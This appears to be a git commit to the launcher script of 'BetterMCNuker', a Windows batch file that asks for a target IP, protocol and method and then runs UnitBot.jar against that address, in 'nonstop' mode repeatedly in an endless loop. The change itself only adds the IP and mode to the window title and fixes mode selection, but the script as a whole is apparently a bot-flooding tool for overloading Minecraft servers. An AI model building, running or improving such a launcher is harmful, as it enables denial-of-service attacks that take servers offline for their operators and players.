b0040af946259fd25a8df05a16bf2e8ff6bc8c82
stonifam5 <stonifam5@gmail.com>
2022-07-31 02:57:33 +0400

    update
    Добавлены IP и режим работы  в названии окна
    Починен выбор режима работы

--- run.bat
+++ run.bat
@@ -3,16 +3,18 @@
 :: Code by who#5301 discord // stonifam5 github
 
 set errors=0
-title %errors% Stops  /  BetterMCNuker / NULL:NULL
+title %errors% Stops  /  BetterMCNuker / NULL:NULL / NULL NULL
 set /p protoc="Protocol: "
-title %errors% Stops  /  BetterMCNuker / %protoc%:NULL
+title %errors% Stops  /  BetterMCNuker / %protoc%:NULL / NULL NULL
 set /p ipc="IP: "
+title %errors% Stops  /  BetterMCNuker / %protoc%:NULL / %modec% %ipc%
 set /p methodc="Method: "
-title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc%
+title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
 :reptomode
 set /p modec="Mode: "
 if /i %modec%==nonstop goto loop
 if /i %modec%==normal goto norm
+goto reptomode
 :loop
 cls
 echo [BetterMCNuker by who#5301]
@@ -20,11 +22,11 @@ echo [BetterMCNuker by who#5301]
 @echo.
 java -jar UnitBot.jar %ipc% %protoc% %methodc% 500 1000
 set /a errors+=1
-title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc% / %modec%
+title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
 goto loop
 :norm
 cls
-title BetterMCNuker / %protoc%:%methodc% / %modec%
+title BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
 echo [BetterMCNuker by who#5301]
 @echo.
 @echo.
